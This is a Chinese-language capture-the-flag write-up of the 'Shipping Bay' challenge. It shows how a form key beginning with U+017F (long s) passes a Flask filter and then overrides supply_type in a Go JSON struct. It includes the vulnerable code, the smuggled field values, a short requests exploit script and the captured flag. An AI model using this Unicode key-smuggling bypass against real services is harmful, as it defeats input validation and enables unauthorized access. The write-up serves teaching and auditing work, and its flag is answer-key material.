# Shipping Bay

## 题目简述

Flask 前端接收货运表单，把字段名全部转成小写并拒绝 `supply_type=flag`；随后它把整个字典序列化为 JSON，交给 Go 编写的处理服务。Go 服务只要解析出的 `Shipment.SupplyType` 为 `flag` 就返回环境变量中的 flag。

漏洞来自 Python 与 Go 对 Unicode 字段名的归一化差异：Python 认为 `U+017F LATIN SMALL LETTER LONG S` 与 ASCII `s` 不同，而 Go 的 JSON 字段匹配会进行 Unicode 大小写折叠。

## 解题过程

Flask 的过滤逻辑是：

```python
shipment_data = {k.lower(): v for k, v in request.form.items()}

if shipment_data['supply_type'] == "flag":
    return "Error: Invalid supply type", 400

shipment_status = subprocess.check_output([
    "/home/user/processing_service",
    json.dumps(shipment_data),
]).decode().strip()
```

如果只提交 `supply_type=flag`，第一层会直接拒绝。改为同时提交两个按顺序排列的字段；第二个键的首字符用 `\u017f` 表示长 s：

```text
supply_type=anything
\u017fupply_type=flag
```

在 Python 中，`"\u017fupply_type".lower() == "supply_type"` 的结果是 `False`，所以 Flask 字典里仍有两个键，安全检查读取 ASCII 键并看到无害值。序列化后的核心 JSON 为：

```json
{"supply_type":"anything","\u017fupply_type":"flag"}
```

Go 的 `encoding/json` 在把 JSON 键匹配到结构体标签 `json:"supply_type"` 时使用 Unicode case folding；长 s 与 `s` 属于同一折叠集合。两个键都会匹配 `Shipment.SupplyType`，后出现的值覆盖先出现的值，因此 Go 服务最终看到 `flag`。

利用脚本如下：

```python
import requests
from urllib.parse import parse_qs, unquote, urlparse

base = "https://TARGET"
r = requests.post(
    f"{base}/create_shipment",
    data=[
        ("supply_type", "anything"),
        ("\u017fupply_type", "flag"),
    ],
)

status = parse_qs(urlparse(r.url).query)["status"][0]
print(unquote(status))
```

重定向 URL 的 `status` 参数中得到：

```text
uiuctf{maybe_we_should_check_schemas_8e229f}
```

## 方法总结

- 核心技巧：构造两个在 Python 中不同、在 Go JSON 结构体匹配中等价的字段名，让验证层和消费层看到不同值。
- 识别信号：请求跨语言传递、前端按字符串键过滤、后端反序列化进结构体，说明需要审计两端的大小写、Unicode 和重复键规则。
- 复用要点：必须保持字段顺序，让恶意键最后覆盖；使用普通字典或某些客户端封装时还要确认它不会预先合并重复或近似字段。
